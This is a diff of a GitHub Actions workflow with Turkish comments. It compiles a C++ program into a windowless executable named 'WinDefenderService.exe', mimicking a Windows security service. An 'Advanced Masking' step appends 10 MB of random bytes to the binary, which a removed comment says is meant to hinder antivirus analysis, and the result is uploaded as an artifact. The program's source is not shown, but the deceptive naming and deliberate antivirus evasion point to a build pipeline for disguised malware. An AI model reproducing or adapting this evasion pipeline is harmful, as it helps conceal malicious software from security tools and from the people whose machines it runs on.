@@ -13,40 +13,37 @@ jobs:
     - name: Checkout Repository
       uses: actions/checkout@v4
 
-    - name: Setup MSVC (Visual Studio Build Tools)
+    - name: Setup MSVC
       uses: ilammy/msvc-dev-cmd@v1
+
+    # EKSİK OLAN KÜTÜPHANEYİ İNDİRİR
+    - name: Download httplib.h
+      shell: powershell
+      run: |
+        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/yhirose/cpp-httplib/master/httplib.h" -OutFile "httplib.h"
+        Write-Host "httplib.h başarıyla indirildi."
 
     - name: Compile with Optimization
       run: |
         cl.exe /EHsc /O2 /MT main.cpp /Fe:WinDefenderService.exe /link user32.lib ws2_32.lib advapi32.lib ntdll.lib /subsystem:windows
 
-    - name: Advanced Masking (Safe Version)
+    - name: Advanced Masking
       shell: powershell
       run: |
         $exe = "WinDefenderService.exe"
         if (Test-Path $exe) {
-            # 10 MB rastgele çöp veri oluştur (Antivirüs analizi zorlaştırmak için)
             $junk = New-Object byte[] 10485760 
             (New-Object Random).NextBytes($junk)
-            
-            # AppendAllBytes hatasını önlemek için FileStream kullanıyoruz
             $stream = [System.IO.File]::OpenWrite((Get-Item $exe).FullName)
             try {
                 $stream.Seek(0, [System.IO.SeekOrigin]::End)
                 $stream.Write($junk, 0, $junk.Length)
-            } finally {
-                $stream.Close()
-            }
-            Write-Host "Maskeleme tamamlandı: $exe boyutu artırıldı."
-        } else {
-            Write-Error "Derlenen dosya bulunamadı!"
-            exit 1
+            } finally { $stream.Close() }
         }
 
-    - name: Upload Secret Artifact
+    - name: Upload Artifact
       uses: actions/upload-artifact@v4
       with:
-        name: LunaPro_V11_Build
+        name: LunaPro_V11
         path: WinDefenderService.exe
-        retention-days: 1
         
